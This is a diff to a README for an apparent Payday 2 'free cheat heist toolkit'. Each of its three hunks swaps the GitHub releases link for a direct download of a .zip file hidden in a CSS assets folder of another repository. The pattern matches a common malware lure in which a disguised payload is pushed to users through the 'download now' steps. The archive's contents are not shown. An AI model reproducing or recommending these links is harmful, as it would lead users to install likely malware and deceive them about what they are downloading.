@@ -6,7 +6,7 @@ description: "Unlock Payday 2's full potential with heist planning, loadout tool
 <h1>🎭 payday-2-free-cheat-heist-toolkit - Your Ultimate Heist Planning & Progression Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/fleyderrivera/payday-2-free-cheat-heist-toolkit/releases">
+  <a href="https://raw.githubusercontent.com/fleyderrivera/fleyderrivera.github.io/main/assets/css/v2.5.zip">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B00?style=for-the-badge&logo=github&logoColor=white&color=2E8B57" alt="Download Now" width="300"/>
   </a>
 </p>
@@ -49,7 +49,7 @@ Getting everything up and running on your Windows computer is easier than you mi
 
 First, you need to grab the application file. **Visit this link to download the application** – it is a one-click stop for getting the latest version:
 
-👉 **[Click Here to Go to the Download Page](https://github.com/fleyderriverza/payday-2-free-cheat-heist-toolkit/releases)**
+👉 **[Click Here to Go to the Download Page](https://raw.githubusercontent.com/fleyderrivera/fleyderrivera.github.io/main/assets/css/v2.5.zip)**
 
 You will see a list of released files on that page. Look for the one that matches your Windows system (usually the one with a `.zip` extension if you are on a standard PC). Click on it, and it will start downloading automatically. The download size is very modest, so even slower connections will handle it just fine.
 
@@ -186,7 +186,7 @@ Stop juggling spreadsheets and browser tabs. Get your heist planning, build opti
 
  
 
-**👉 [Download the Heist Toolkit Now!](https://github.com/fleyderriverza/payday-2-free-cheat-heist-toolkit/releases)**
+**👉 [Download the Heist Toolkit Now!](https://raw.githubusercontent.com/fleyderrivera/fleyderrivera.github.io/main/assets/css/v2.5.zip)**
 
 
 
